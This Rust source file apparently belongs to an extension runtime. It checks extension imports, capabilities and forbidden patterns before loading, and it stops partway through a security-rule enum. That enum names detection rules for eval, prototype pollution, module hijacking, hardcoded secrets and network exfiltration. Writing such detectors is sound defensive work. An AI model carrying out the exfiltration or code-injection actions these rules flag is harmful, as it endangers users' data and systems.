// Extension compatibility preflight analyzer (bd-k5q5.3.11)
//
// Checks an extension's source before loading to predict whether it will
// work in the Pi JS runtime. Combines:
//   - Module import scanning against known shim support levels
//   - Capability requirement detection vs current policy
//   - Forbidden/flagged pattern detection
//   - Actionable remediation suggestions
//
// Produces a structured `PreflightReport` with per-finding severity,
// an overall verdict (Pass / Warn / Fail), and human-readable remediation.

use std::collections::BTreeMap;
use std::fmt::{self, Write};
use std::path::Path;

use serde::{Deserialize, Serialize};

use crate::extensions::{CompatibilityScanner, ExtensionPolicy, PolicyDecision};

// ============================================================================
// Module support level
// ============================================================================

/// How well the Pi JS runtime supports a given module.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ModuleSupport {
    /// Fully implemented with real behaviour.
    Real,
    /// Partially implemented — some APIs are stubs or missing.
    Partial,
    /// Exists as a stub (loads without error but does nothing useful).
    Stub,
    /// Module resolves but throws on import (e.g. `node:tls`).
    ErrorThrow,
    /// Module is completely missing — import will fail at load time.
    Missing,
}

impl ModuleSupport {
    /// Severity of this support level for preflight purposes.
    #[must_use]
    pub const fn severity(self) -> FindingSeverity {
        match self {
            Self::Real => FindingSeverity::Info,
            Self::Partial | Self::Stub => FindingSeverity::Warning,
            Self::ErrorThrow | Self::Missing => FindingSeverity::Error,
        }
    }

    /// Human-readable label.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::Real => "fully supported",
            Self::Partial => "partially supported",
            Self::Stub => "stub only",
            Self::ErrorThrow => "throws on import",
            Self::Missing => "not available",
        }
    }
}

impl fmt::Display for ModuleSupport {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.label())
    }
}

// ============================================================================
// Finding severity and categories
// ============================================================================

/// Severity level for a preflight finding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FindingSeverity {
    /// Informational — no action required.
    Info,
    /// Warning — may affect functionality but extension can still load.
    Warning,
    /// Error — likely to cause load or runtime failure.
    Error,
}

impl fmt::Display for FindingSeverity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Info => f.write_str("info"),
            Self::Warning => f.write_str("warning"),
            Self::Error => f.write_str("error"),
        }
    }
}

/// Category of a preflight finding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FindingCategory {
    /// Input or scan failure prevented a trustworthy analysis.
    AnalysisInput,
    /// Module import compatibility.
    ModuleCompat,
    /// Capability policy decision.
    CapabilityPolicy,
    /// Forbidden pattern detected.
    ForbiddenPattern,
    /// Flagged pattern detected.
    FlaggedPattern,
}

impl fmt::Display for FindingCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::AnalysisInput => f.write_str("analysis_input"),
            Self::ModuleCompat => f.write_str("module_compat"),
            Self::CapabilityPolicy => f.write_str("capability_policy"),
            Self::ForbiddenPattern => f.write_str("forbidden_pattern"),
            Self::FlaggedPattern => f.write_str("flagged_pattern"),
        }
    }
}

// ============================================================================
// Preflight finding
// ============================================================================

/// A single finding from preflight analysis.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PreflightFinding {
    pub severity: FindingSeverity,
    pub category: FindingCategory,
    /// Short summary of the issue.
    pub message: String,
    /// Actionable remediation suggestion (if any).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub remediation: Option<String>,
    /// Optional file/line evidence.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub file: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub line: Option<usize>,
}

// ============================================================================
// Preflight verdict
// ============================================================================

/// Overall verdict from preflight analysis.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PreflightVerdict {
    /// Extension is expected to work without issues.
    Pass,
    /// Extension may work but some features could be degraded.
    Warn,
    /// Extension is likely to fail at load or runtime.
    Fail,
}

impl fmt::Display for PreflightVerdict {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Pass => f.write_str("PASS"),
            Self::Warn => f.write_str("WARN"),
            Self::Fail => f.write_str("FAIL"),
        }
    }
}

// ============================================================================
// Preflight report
// ============================================================================

/// Complete preflight analysis report for an extension.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PreflightReport {
    pub schema: String,
    pub extension_id: String,
    pub verdict: PreflightVerdict,
    pub confidence: ConfidenceScore,
    pub risk_banner: String,
    pub findings: Vec<PreflightFinding>,
    pub summary: PreflightSummary,
}

/// Compatibility confidence score (0..=100).
///
/// Computed from the severity distribution of findings:
/// - Each error deducts 25 points (capped at 100)
/// - Each warning deducts 10 points (capped at remaining score)
/// - Score is clamped to [0, 100]
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub struct ConfidenceScore(pub u8);

impl ConfidenceScore {
    /// Compute from error/warning counts.
    #[must_use]
    pub fn from_counts(errors: usize, warnings: usize) -> Self {
        let penalty = errors
            .saturating_mul(25)
            .saturating_add(warnings.saturating_mul(10));
        let score = 100_usize.saturating_sub(penalty);
        Self(u8::try_from(score.min(100)).unwrap_or(0))
    }

    /// Score value 0..=100.
    #[must_use]
    pub const fn value(self) -> u8 {
        self.0
    }

    /// Human-readable confidence label.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self.0 {
            90..=100 => "High",
            60..=89 => "Medium",
            30..=59 => "Low",
            _ => "Very Low",
        }
    }
}

impl fmt::Display for ConfidenceScore {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}% ({})", self.0, self.label())
    }
}

/// Counts by severity.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PreflightSummary {
    pub errors: usize,
    pub warnings: usize,
    pub info: usize,
}

pub const PREFLIGHT_SCHEMA: &str = "pi.ext.preflight.v1";

impl PreflightReport {
    /// Create from findings.
    #[must_use]
    pub fn from_findings(extension_id: String, findings: Vec<PreflightFinding>) -> Self {
        let mut summary = PreflightSummary::default();
        for f in &findings {
            match f.severity {
                FindingSeverity::Error => summary.errors += 1,
                FindingSeverity::Warning => summary.warnings += 1,
                FindingSeverity::Info => summary.info += 1,
            }
        }

        let verdict = if summary.errors > 0 {
            PreflightVerdict::Fail
        } else if summary.warnings > 0 {
            PreflightVerdict::Warn
        } else {
            PreflightVerdict::Pass
        };

        let confidence = ConfidenceScore::from_counts(summary.errors, summary.warnings);
        let risk_banner = risk_banner_text(verdict, confidence, &summary);

        Self {
            schema: PREFLIGHT_SCHEMA.to_string(),
            extension_id,
            verdict,
            confidence,
            risk_banner,
            findings,
            summary,
        }
    }

    /// Render a human-readable markdown report.
    #[must_use]
    pub fn render_markdown(&self) -> String {
        let mut out = String::new();
        let _ = write!(
            out,
            "# Preflight Report: {}\n\n**Verdict**: {} | **Confidence**: {}\n\n",
            self.extension_id, self.verdict, self.confidence
        );
        let _ = writeln!(out, "> {}\n", self.risk_banner);
        let _ = write!(
            out,
            "| Errors | Warnings | Info |\n|--------|----------|------|\n| {} | {} | {} |\n\n",
            self.summary.errors, self.summary.warnings, self.summary.info
        );

        if self.findings.is_empty() {
            out.push_str("No issues found. Extension is expected to work.\n");
            return out;
        }

        out.push_str("## Findings\n\n");
        for (i, f) in self.findings.iter().enumerate() {
            let icon = match f.severity {
                FindingSeverity::Error => "x",
                FindingSeverity::Warning => "!",
                FindingSeverity::Info => "i",
            };
            let _ = writeln!(
                out,
                "{}. [{}] **{}**: {}",
                i + 1,
                icon,
                f.category,
                f.message
            );
            if let Some(loc) = &f.file {
                if let Some(line) = f.line {
                    let _ = writeln!(out, "   Location: {loc}:{line}");
                } else {
                    let _ = writeln!(out, "   Location: {loc}");
                }
            }
            if let Some(rem) = &f.remediation {
                let _ = writeln!(out, "   Remediation: {rem}");
            }
            out.push('\n');
        }

        out
    }

    /// Serialize to JSON.
    ///
    /// # Errors
    ///
    /// Returns an error if serialization fails.
    pub fn to_json(&self) -> Result<String, serde_json::Error> {
        serde_json::to_string_pretty(self)
    }
}

// ============================================================================
// Known module support registry
// ============================================================================

/// Returns the known support level for a module specifier, or `None` if the
/// module is not in our registry (likely a relative import or external npm).
#[must_use]
#[allow(clippy::match_same_arms)]
pub fn known_module_support(specifier: &str) -> Option<ModuleSupport> {
    let normalized = specifier.strip_prefix("node:").unwrap_or(specifier);

    // Match on the root module name (before any slash sub-path).
    let module_root = normalized.split('/').next().unwrap_or(normalized);

    match module_root {
        // P0 — fully implemented
        "path" | "os" => Some(ModuleSupport::Real),
        "fs" => {
            // node:fs is real, node:fs/promises is partial
            if normalized == "fs/promises" {
                Some(ModuleSupport::Partial)
            } else {
                Some(ModuleSupport::Real)
            }
        }
        "child_process" => Some(ModuleSupport::Real),

        // P1 — real
        "url" | "util" | "events" | "stream" | "buffer" | "querystring" | "string_decoder"
        | "timers" => Some(ModuleSupport::Real),

        // P1 — partial
        "crypto" | "zlib" => Some(ModuleSupport::Partial),
        "readline" | "test" => Some(ModuleSupport::Partial),
        "http" | "https" => Some(ModuleSupport::Partial),

        // P2 — stubs
        "tty"
        | "assert"
        | "http2"
        | "net"
        | "vm"
        | "v8"
        | "perf_hooks"
        | "worker_threads"
        | "diagnostics_channel"
        | "async_hooks" => Some(ModuleSupport::Stub),

        // P3 — error throw
        "dgram" | "dns" | "tls" | "cluster" => Some(ModuleSupport::ErrorThrow),

        // Known npm packages with real shims
        "@sinclair/typebox" | "zod" => Some(ModuleSupport::Real),

        // Known npm packages with partial shims
        "glob" => Some(ModuleSupport::Partial),

        // Known npm packages with stubs
        "chokidar" | "jsdom" | "turndown" | "beautiful-mermaid" | "node-pty" | "ws" | "axios"
        | "open" | "commander" | "chalk" | "better-sqlite3" => Some(ModuleSupport::Stub),

        // @modelcontextprotocol
        "@modelcontextprotocol" => Some(ModuleSupport::Stub),

        // @mariozechner packages
        "@mariozechner" => Some(ModuleSupport::Partial),

        // @opentelemetry
        "@opentelemetry" => Some(ModuleSupport::Stub),

        _ => None,
    }
}

/// Remediation suggestion for a module at a given support level.
#[must_use]
pub fn module_remediation(specifier: &str, support: ModuleSupport) -> Option<String> {
    let normalized = specifier.strip_prefix("node:").unwrap_or(specifier);
    let module_root = normalized.split('/').next().unwrap_or(normalized);

    match (module_root, support) {
        (_, ModuleSupport::Real) => None,
        ("fs", ModuleSupport::Partial) => Some(
            "fs/promises has partial coverage. Use synchronous fs APIs (existsSync, readFileSync, writeFileSync) for best compatibility.".to_string()
        ),
        ("crypto", ModuleSupport::Partial) => Some(
            "Only createHash, randomBytes, and randomUUID are available. For other crypto ops, consider using the Web Crypto API.".to_string()
        ),
        ("readline", ModuleSupport::Partial | ModuleSupport::Stub) => Some(
            "Readline uses pi.ui('input') when UI is available; otherwise prompts return empty strings. readline/promises mirrors this behavior.".to_string()
        ),
        ("test", ModuleSupport::Partial) => Some(
            "node:test includes a minimal runner (test/describe/it + hooks + run). Reporters, snapshots, and concurrency controls are not supported.".to_string()
        ),
        ("http" | "https", ModuleSupport::Partial) => Some(
            "HTTP client functionality is available via fetch(). HTTP server functionality is not supported.".to_string()
        ),
        ("http2", ModuleSupport::Stub) => Some(
            "node:http2 is stubbed; use fetch() for client requests instead.".to_string()
        ),
        ("net", ModuleSupport::Stub | ModuleSupport::Partial) => Some(
            "Raw TCP sockets are stubbed (no network I/O). Use fetch() for HTTP or the pi.http hostcall for network requests.".to_string()
        ),
        ("tls", ModuleSupport::ErrorThrow) => Some(
            "TLS sockets are not available. Use fetch() with HTTPS URLs instead.".to_string()
        ),
        ("dns", ModuleSupport::ErrorThrow) => Some(
            "DNS resolution is not available. Use fetch() which handles DNS internally.".to_string()
        ),
        ("dgram" | "cluster", ModuleSupport::ErrorThrow) => Some(
            format!("The `{module_root}` module is not supported in the extension runtime.")
        ),
        ("chokidar", _) => Some(
            "File watching is not supported. Consider polling with fs.existsSync or using event hooks instead.".to_string()
        ),
        ("jsdom", _) => Some(
            "DOM parsing is not available. Consider extracting text content without DOM manipulation.".to_string()
        ),
        ("ws", _) => Some(
            "WebSocket support is not available. Use fetch() for HTTP-based communication.".to_string()
        ),
        ("node-pty", _) => Some(
            "PTY support is not available. Use pi.exec() hostcall for command execution.".to_string()
        ),
        (_, ModuleSupport::Missing) => Some(
            format!("Module `{normalized}` is not available. Check if there is an alternative API in the pi extension SDK.")
        ),
        (_, ModuleSupport::Stub) => Some(
            format!("Module `{normalized}` is a stub — it loads without error but provides no real functionality.")
        ),
        _ => None,
    }
}

// ============================================================================
// Preflight analyzer
// ============================================================================

/// Analyzes an extension for compatibility before loading.
pub struct PreflightAnalyzer<'a> {
    policy: &'a ExtensionPolicy,
    extension_id: Option<&'a str>,
}

impl<'a> PreflightAnalyzer<'a> {
    /// Create a new preflight analyzer with the given policy context.
    #[must_use]
    pub const fn new(policy: &'a ExtensionPolicy, extension_id: Option<&'a str>) -> Self {
        Self {
            policy,
            extension_id,
        }
    }

    /// Run preflight analysis on an extension at the given path.
    ///
    /// The path can be a single file or a directory containing extension source.
    pub fn analyze(&self, path: &Path) -> PreflightReport {
        let ext_id = self
            .extension_id
            .map(str::to_string)
            .or_else(|| {
                path.file_name()
                    .and_then(|name| name.to_str())
                    .map(str::to_string)
            })
            .unwrap_or_else(|| "unknown".to_string());

        match validate_extension_scan_input(path) {
            Ok(true) => {}
            Ok(false) => {
                return PreflightReport::from_findings(
                    ext_id,
                    vec![PreflightFinding {
                        severity: FindingSeverity::Error,
                        category: FindingCategory::AnalysisInput,
                        message: format!("Extension path does not exist: {}", path.display()),
                        remediation: Some(
                            "Verify the extension path exists and points to a readable file or directory."
                                .to_string(),
                        ),
                        file: Some(path.display().to_string()),
                        line: None,
                    }],
                );
            }
            Err(err) => {
                return PreflightReport::from_findings(
                    ext_id,
                    vec![PreflightFinding {
                        severity: FindingSeverity::Error,
                        category: FindingCategory::AnalysisInput,
                        message: format!(
                            "Failed to access extension source at {}: {err}",
                            path.display()
                        ),
                        remediation: Some(
                            "Verify the extension files and their parent directories are readable and searchable, then retry the preflight check."
                                .to_string(),
                        ),
                        file: Some(path.display().to_string()),
                        line: None,
                    }],
                );
            }
        }

        let scanner = CompatibilityScanner::new(path.to_path_buf());
        let scan_result = scanner.scan_path(path);

        let ledger = match scan_result {
            Ok(ledger) => ledger,
            Err(err) => {
                return PreflightReport::from_findings(
                    ext_id,
                    vec![PreflightFinding {
                        severity: FindingSeverity::Error,
                        category: FindingCategory::AnalysisInput,
                        message: format!(
                            "Failed to scan extension source at {}: {err}",
                            path.display()
                        ),
                        remediation: Some(
                            "Verify the extension files are readable and retry the preflight check."
                                .to_string(),
                        ),
                        file: Some(path.display().to_string()),
                        line: None,
                    }],
                );
            }
        };

        let mut findings = Vec::new();

        // 1. Check module imports for compatibility
        Self::check_module_findings(&ledger, &mut findings);

        // 2. Check capability requirements against policy
        self.check_capability_findings(&ledger, &mut findings);

        // 3. Check forbidden patterns
        Self::check_forbidden_findings(&ledger, &mut findings);

        // 4. Check flagged patterns
        Self::check_flagged_findings(&ledger, &mut findings);

        // Sort: errors first, then warnings, then info
        findings.sort_by_key(|finding| std::cmp::Reverse(finding.severity));

        PreflightReport::from_findings(ext_id, findings)
    }

    /// Analyze from raw source text (for testing or when path isn't available).
    #[must_use]
    pub fn analyze_source(&self, extension_id: &str, source: &str) -> PreflightReport {
        let mut findings = Vec::new();

        // Extract import specifiers from source
        let mut module_imports: BTreeMap<String, Vec<usize>> = BTreeMap::new();
        for (idx, line) in source.lines().enumerate() {
            let line_no = idx + 1;
            for specifier in extract_import_specifiers_simple(line) {
                module_imports.entry(specifier).or_default().push(line_no);
            }
        }

        // Check each imported module
        for (specifier, lines) in &module_imports {
            if let Some(support) = known_module_support(specifier) {
                let severity = support.severity();
                if severity > FindingSeverity::Info {
                    let remediation = module_remediation(specifier, support);
                    findings.push(PreflightFinding {
                        severity,
                        category: FindingCategory::ModuleCompat,
                        message: format!("Module `{specifier}` is {support}"),
                        remediation,
                        file: None,
                        line: lines.first().copied(),
                    });
                }
            }
        }

        // Check for capability patterns
        let mut caps_seen: BTreeMap<String, usize> = BTreeMap::new();
        for (idx, line) in source.lines().enumerate() {
            let line_no = idx + 1;
            if line.contains("process.env") && !caps_seen.contains_key("env") {
                caps_seen.insert("env".to_string(), line_no);
            }
            if (line.contains("pi.exec") || line.contains("child_process"))
                && !caps_seen.contains_key("exec")
            {
                caps_seen.insert("exec".to_string(), line_no);
            }
        }

        for (cap, line_no) in &caps_seen {
            let check = self.policy.evaluate_for(cap, self.extension_id);
            match check.decision {
                PolicyDecision::Deny => {
                    findings.push(PreflightFinding {
                        severity: FindingSeverity::Error,
                        category: FindingCategory::CapabilityPolicy,
                        message: format!(
                            "Capability `{cap}` is denied by policy (reason: {})",
                            check.reason
                        ),
                        remediation: Some(capability_remediation(cap)),
                        file: None,
                        line: Some(*line_no),
                    });
                }
                PolicyDecision::Prompt => {
                    findings.push(PreflightFinding {
                        severity: FindingSeverity::Warning,
                        category: FindingCategory::CapabilityPolicy,
                        message: format!(
                            "Capability `{cap}` will require user confirmation"
                        ),
                        remediation: Some(format!(
                            "To allow without prompting, add `{cap}` to default_caps in your extension policy config."
                        )),
                        file: None,
                        line: Some(*line_no),
                    });
                }
                PolicyDecision::Allow => {}
            }
        }

        // Sort: errors first, then warnings, then info
        findings.sort_by_key(|finding| std::cmp::Reverse(finding.severity));

        PreflightReport::from_findings(extension_id.to_string(), findings)
    }

    fn check_module_findings(
        ledger: &crate::extensions::CompatLedger,
        findings: &mut Vec<PreflightFinding>,
    ) {
        // Collect unique module specifiers from rewrites and flagged imports
        let mut seen_modules: BTreeMap<String, Option<(String, usize)>> = BTreeMap::new();

        // From rewrites — these are imports that have rewrite rules
        for rw in &ledger.rewrites {
            seen_modules
                .entry(rw.from.clone())
                .or_insert_with(|| rw.evidence.first().map(|e| (e.file.clone(), e.line)));
        }

        // From flagged unsupported imports
        for fl in &ledger.flagged {
            if fl.rule == "unsupported_import" {
                // Extract the module specifier from the message
                if let Some(spec) = extract_specifier_from_message(&fl.message) {
                    seen_modules
                        .entry(spec)
                        .or_insert_with(|| fl.evidence.first().map(|e| (e.file.clone(), e.line)));
                }
            }
        }

        for (specifier, loc) in &seen_modules {
            if let Some(support) = known_module_support(specifier) {
                let severity = support.severity();
                if severity > FindingSeverity::Info {
                    let remediation = module_remediation(specifier, support);
                    let (file, line) = loc
                        .as_ref()
                        .map_or((None, None), |(f, l)| (Some(f.clone()), Some(*l)));
                    findings.push(PreflightFinding {
                        severity,
                        category: FindingCategory::ModuleCompat,
                        message: format!("Module `{specifier}` is {support}"),
                        remediation,
                        file,
                        line,
                    });
                }
            }
        }
    }

    fn check_capability_findings(
        &self,
        ledger: &crate::extensions::CompatLedger,
        findings: &mut Vec<PreflightFinding>,
    ) {
        // Deduplicate by capability name
        let mut seen: BTreeMap<String, (String, usize)> = BTreeMap::new();

        for cap_ev in &ledger.capabilities {
            if !seen.contains_key(&cap_ev.capability) {
                let loc = cap_ev
                    .evidence
                    .first()
                    .map(|e| (e.file.clone(), e.line))
                    .unwrap_or_default();
                seen.insert(cap_ev.capability.clone(), loc);
            }
        }

        for (cap, (file, line)) in &seen {
            let check = self.policy.evaluate_for(cap, self.extension_id);
            let file = (!file.is_empty()).then(|| file.clone());
            let line = (*line > 0).then_some(*line);
            match check.decision {
                PolicyDecision::Deny => {
                    findings.push(PreflightFinding {
                        severity: FindingSeverity::Error,
                        category: FindingCategory::CapabilityPolicy,
                        message: format!(
                            "Capability `{cap}` is denied by policy (reason: {})",
                            check.reason
                        ),
                        remediation: Some(capability_remediation(cap)),
                        file,
                        line,
                    });
                }
                PolicyDecision::Prompt => {
                    findings.push(PreflightFinding {
                        severity: FindingSeverity::Warning,
                        category: FindingCategory::CapabilityPolicy,
                        message: format!(
                            "Capability `{cap}` will require user confirmation"
                        ),
                        remediation: Some(format!(
                            "To allow without prompting, add `{cap}` to default_caps in your extension policy config."
                        )),
                        file,
                        line,
                    });
                }
                PolicyDecision::Allow => {}
            }
        }
    }

    fn check_forbidden_findings(
        ledger: &crate::extensions::CompatLedger,
        findings: &mut Vec<PreflightFinding>,
    ) {
        for fb in &ledger.forbidden {
            let loc = fb.evidence.first();
            findings.push(PreflightFinding {
                severity: FindingSeverity::Error,
                category: FindingCategory::ForbiddenPattern,
                message: fb.message.clone(),
                remediation: fb.remediation.clone(),
                file: loc.map(|e| e.file.clone()),
                line: loc.map(|e| e.line),
            });
        }
    }

    fn check_flagged_findings(
        ledger: &crate::extensions::CompatLedger,
        findings: &mut Vec<PreflightFinding>,
    ) {
        for fl in &ledger.flagged {
            // Skip unsupported_import — handled in check_module_findings
            if fl.rule == "unsupported_import" {
                continue;
            }
            let loc = fl.evidence.first();
            findings.push(PreflightFinding {
                severity: FindingSeverity::Warning,
                category: FindingCategory::FlaggedPattern,
                message: fl.message.clone(),
                remediation: fl.remediation.clone(),
                file: loc.map(|e| e.file.clone()),
                line: loc.map(|e| e.line),
            });
        }
    }
}

/// Validate whether an extension path exists and can be scanned.
///
/// Unlike [`Path::exists`], this preserves `PermissionDenied` and other typed
/// probe errors. On Unix, ancestors are checked before interpreting a missing
/// leaf so UID 0 cannot report a path below an inaccessible directory as merely
/// absent.
fn validate_extension_scan_input(path: &Path) -> std::io::Result<bool> {
    #[cfg(unix)]
    {
        let access_context = crate::platform::EffectiveModeAccessContext::current()?;
        ensure_extension_scan_ancestors_searchable(path, &access_context)?;

        if !path.try_exists()? {
            return Ok(false);
        }

        validate_extension_scan_permissions_after_lexical(path, &access_context)?;
        Ok(true)
    }

    #[cfg(not(unix))]
    {
        if !path.try_exists()? {
            return Ok(false);
        }

        validate_extension_scan_permissions(path)?;
        Ok(true)
    }
}

/// Require search access through both the lexical input path and its canonical
/// target, then validate every directory and source file either path scanner
/// can visit. Checking the canonical path closes terminal-symlink escapes such
/// as `input.js -> locked/extension.js`.
#[cfg(unix)]
fn validate_extension_scan_permissions(path: &Path) -> std::io::Result<()> {
    let access_context = crate::platform::EffectiveModeAccessContext::current()?;
    ensure_extension_scan_ancestors_searchable(path, &access_context)?;
    validate_extension_scan_permissions_after_lexical(path, &access_context)
}

#[cfg(unix)]
fn validate_extension_scan_permissions_after_lexical(
    path: &Path,
    access_context: &crate::platform::EffectiveModeAccessContext,
) -> std::io::Result<()> {
    use crate::platform::{UNIX_ACCESS_READ, UNIX_ACCESS_SEARCH};

    let canonical_path = std::fs::canonicalize(path)?;
    ensure_extension_scan_ancestors_searchable(&canonical_path, access_context)?;

    let mut pending = vec![canonical_path];
    while let Some(scan_path) = pending.pop() {
        let metadata = std::fs::metadata(&scan_path)?;

        if metadata.is_file() {
            // A direct security-scan input is read even when its extension is
            // not JS-like. Descendant files enter `pending` only when scannable.
            access_context.ensure(
                &metadata,
                &scan_path,
                UNIX_ACCESS_READ,
                "extension source reading",
            )?;
            continue;
        }

        if !metadata.is_dir() {
            continue;
        }

        access_context.ensure(
            &metadata,
            &scan_path,
            UNIX_ACCESS_READ | UNIX_ACCESS_SEARCH,
            "extension source directory scanning",
        )?;

        for entry in std::fs::read_dir(&scan_path)? {
            let entry = entry?;
            let file_type = entry.file_type()?;
            let child = entry.path();
            if file_type.is_dir() {
                if !extension_scan_directory_is_ignored_by_all(&child) {
                    pending.push(child);
                }
            } else if file_type.is_file() && extension_scan_file_is_js_like(&child) {
                pending.push(child);
            }
            // Both scanners intentionally ignore nested symlinks. The caller's
            // terminal symlink is followed through `canonicalize` above.
        }
    }

    Ok(())
}

#[cfg(not(unix))]
fn validate_extension_scan_permissions(_path: &Path) -> std::io::Result<()> {
    Ok(())
}

#[cfg(unix)]
fn ensure_extension_scan_ancestors_searchable(
    path: &Path,
    access_context: &crate::platform::EffectiveModeAccessContext,
) -> std::io::Result<()> {
    use crate::platform::UNIX_ACCESS_SEARCH;

    let absolute_path = if path.is_absolute() {
        path.to_path_buf()
    } else {
        std::env::current_dir()?.join(path)
    };

    for directory in absolute_path.ancestors().skip(1) {
        if directory.as_os_str().is_empty() {
            continue;
        }
        match std::fs::metadata(directory) {
            Ok(metadata) => {
                if !metadata.is_dir() {
                    return Err(std::io::Error::new(
                        std::io::ErrorKind::NotADirectory,
                        format!("Not a directory: {}", directory.display()),
                    ));
                }
                access_context.ensure(
                    &metadata,
                    directory,
                    UNIX_ACCESS_SEARCH,
                    "extension path traversal",
                )?;
            }
            Err(err) if err.kind() == std::io::ErrorKind::NotFound => {}
            Err(err) => return Err(err),
        }
    }

    Ok(())
}

#[cfg(unix)]
fn extension_scan_directory_is_ignored_by_all(path: &Path) -> bool {
    path.file_name()
        .and_then(|name| name.to_str())
        .is_some_and(|name| matches!(name, "node_modules" | ".git"))
}

#[cfg(unix)]
fn extension_scan_file_is_js_like(path: &Path) -> bool {
    path.extension()
        .and_then(|extension| extension.to_str())
        .is_some_and(|extension| {
            matches!(
                extension,
                "ts" | "js" | "tsx" | "jsx" | "mjs" | "cjs" | "mts" | "cts"
            )
        })
}

// ============================================================================
// Helpers
// ============================================================================

/// Generate a one-line risk banner for user-facing display.
fn risk_banner_text(
    verdict: PreflightVerdict,
    confidence: ConfidenceScore,
    summary: &PreflightSummary,
) -> String {
    match verdict {
        PreflightVerdict::Pass => format!("Extension is compatible (confidence: {confidence})"),
        PreflightVerdict::Warn => format!(
            "Extension may have issues: {} warning(s) (confidence: {confidence})",
            summary.warnings
        ),
        PreflightVerdict::Fail => format!(
            "Extension is likely incompatible: {} error(s), {} warning(s) (confidence: {confidence})",
            summary.errors, summary.warnings
        ),
    }
}

/// Extract module specifier from a compat scanner message like
/// "import of unsupported builtin `node:vm`".
fn extract_specifier_from_message(msg: &str) -> Option<String> {
    let start = msg.find('`')?;
    let end = msg[start + 1..].find('`')?;
    Some(msg[start + 1..start + 1 + end].to_string())
}

/// Simple import specifier extraction for source analysis.
/// Handles: import ... from "spec", require("spec"), import("spec").
fn extract_import_specifiers_simple(line: &str) -> Vec<String> {
    let mut specs = Vec::new();
    let trimmed = line.trim();

    // import ... from "spec" / import ... from 'spec' / import "spec"
    if trimmed.starts_with("import ") || trimmed.starts_with("export ") {
        if let Some(from_idx) = trimmed.find(" from ") {
            let rest = &trimmed[from_idx + 6..];
            if let Some(spec) = extract_quoted_string(rest)
                && !spec.starts_with('.')
                && !spec.starts_with('/')
            {
                specs.push(spec);
            }
        } else if let Some(rest) = trimmed.strip_prefix("import ") {
            // Check for side-effect import: import "spec"
            if let Some(spec) = extract_quoted_string(rest)
                && !spec.starts_with('.')
                && !spec.starts_with('/')
            {
                specs.push(spec);
            }
        }
    }

    // require("spec") / require('spec')
    let mut search = trimmed;
    while let Some(req_idx) = search.find("require(") {
        let rest = &search[req_idx + 8..];
        if let Some(spec) = extract_quoted_string(rest)
            && !spec.starts_with('.')
            && !spec.starts_with('/')
        {
            specs.push(spec);
        }
        search = &search[req_idx + 8..];
    }

    specs
}

/// Extract a single or double quoted string from the start of text.
fn extract_quoted_string(text: &str) -> Option<String> {
    let trimmed = text.trim();
    let (quote, rest) = match trimmed.strip_prefix('"') {
        Some(rest) => ('"', rest),
        None => ('\'', trimmed.strip_prefix('\'')?),
    };

    rest.find(quote).map(|end| rest[..end].to_string())
}

/// Remediation text for a denied capability.
fn capability_remediation(cap: &str) -> String {
    match cap {
        "exec" => "To enable shell command execution, use `--allow-dangerous` CLI flag or set `allow_dangerous: true` in config. This grants access to exec and env capabilities.".to_string(),
        "env" => "To enable environment variable access, use `--allow-dangerous` CLI flag or set `allow_dangerous: true` in config. Alternatively, add a per-extension override: `per_extension.\"<ext-id>\".allow = [\"env\"]`.".to_string(),
        _ => format!("Add `{cap}` to `default_caps` in your extension policy configuration."),
    }
}

// ============================================================================
// Security Risk Classification (bd-21vng, SEC-2.3)
// ============================================================================

/// Schema version for security scan reports. Bump minor on new rules, major on
/// breaking structural changes.
pub const SECURITY_SCAN_SCHEMA: &str = "pi.ext.security_scan.v1";

/// Stable rule identifiers. Each variant is a versioned detection rule whose
/// semantics are frozen once shipped. Add new variants; never rename or
/// redefine existing ones.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum SecurityRuleId {
    // ---- Critical tier ----
    /// Dynamic code execution via `eval()`.
    #[serde(rename = "SEC-EVAL-001")]
    EvalUsage,
    /// Dynamic code execution via `new Function(...)`.
    #[serde(rename = "SEC-FUNC-001")]
    NewFunctionUsage,
    /// Native module loading via `process.binding()`.
    #[serde(rename = "SEC-BIND-001")]
    ProcessBinding,
    /// Native addon loading via `process.dlopen()`.
    #[serde(rename = "SEC-DLOPEN-001")]
    ProcessDlopen,
    /// Prototype pollution via `__proto__` assignment.
    #[serde(rename = "SEC-PROTO-001")]
    ProtoPollution,
    /// `require.cache` manipulation for module hijacking.
    #[serde(rename = "SEC-RCACHE-001")]
    RequireCacheManip,

    // ---- High tier ----
    /// Hardcoded secret or API key pattern.
    #[serde(rename = "SEC-SECRET-001")]
    HardcodedSecret,
    /// Dynamic `import()` expression (runtime code loading).
    #[serde(rename = "SEC-DIMPORT-001")]
    DynamicImport,
    /// `Object.defineProperty` on global or prototype objects.
    #[serde(rename = "SEC-DEFPROP-001")]
    DefinePropertyAbuse,
    /// Network exfiltration pattern (fetch/XMLHttpRequest to constructed URL).
    #[serde(rename = "SEC-EXFIL-001")]
    NetworkExfiltration,
    /// Writes to sensitive filesystem paths.
    #[serde(rename = "SEC-FSSENS-001")]
